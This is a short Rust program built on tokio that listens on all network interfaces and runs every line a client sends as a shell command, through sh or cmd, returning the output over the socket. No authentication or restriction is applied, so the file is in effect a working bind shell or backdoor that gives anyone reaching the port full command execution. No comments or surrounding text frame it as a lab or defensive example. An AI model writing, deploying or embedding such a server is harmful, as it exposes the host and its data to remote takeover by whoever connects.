use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::process::Command;
use std::process::Stdio;

async fn handle(mut stream: TcpStream) {
    let (reader, mut writer) = stream.split();
    let mut reader = BufReader::new(reader);

    let mut line = String::new();
    reader.read_line(&mut line).await.unwrap();
    let command = line.trim().to_string();

    writer
        .write_all(format!("Running: {command}\n").as_bytes())
        .await
        .unwrap();

    let mut child = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", &command])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
    } else {
        Command::new("sh")
            .args(["-c", &command])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
    }
    .expect("Failed to spawn command");

    let stdout = child.stdout.take().unwrap();
    let stderr = child.stderr.take().unwrap();

    let mut stdout_reader = BufReader::new(stdout);
    let mut stderr_reader = BufReader::new(stderr);

    let mut out_buf = String::new();
    let mut err_buf = String::new();
    loop {
        out_buf.clear();
        err_buf.clear();
        tokio::select! {
            n = stdout_reader.read_line(&mut out_buf) => {
                if n.unwrap() == 0 { break; }
                writer.write_all(out_buf.as_bytes()).await.unwrap();
            }
            n = stderr_reader.read_line(&mut err_buf) => {
                if n.unwrap() == 0 { break; }
                writer.write_all(err_buf.as_bytes()).await.unwrap();
            }
        }
    }

    child.wait().await.unwrap();
}

#[tokio::main]
async fn main() {
    let port = std::env::args().nth(1).unwrap_or_else(|| "8000".to_string());
    let addr = format!("0.0.0.0:{port}");
    let listener = TcpListener::bind(&addr).await.expect("Failed to bind");

    loop {
        match listener.accept().await {
            Ok((stream, _)) => { tokio::spawn(handle(stream)); }
            Err(e) => eprintln!("Connection error: {e}"),
        }
    }
}
